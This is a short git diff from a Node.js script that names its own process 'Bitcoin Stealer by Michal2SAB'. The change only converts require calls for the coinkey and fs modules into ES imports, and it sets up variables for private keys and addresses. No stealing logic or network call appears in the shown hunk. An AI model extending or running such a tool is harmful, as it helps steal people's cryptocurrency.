@@ -4,8 +4,10 @@ import fetch from "node-fetch";
 
 process.title = "Bitcoin Stealer by Michal2SAB";
 
-const CoinKey = require('coinkey');
-const fs = require('fs');
+import CoinKey from "coinkey";
+import fs from "fs";
+// const CoinKey = require('coinkey');
+// const fs = require('fs');
 
 let privateKeyHex, ck, addresses;
 addresses = new Map();
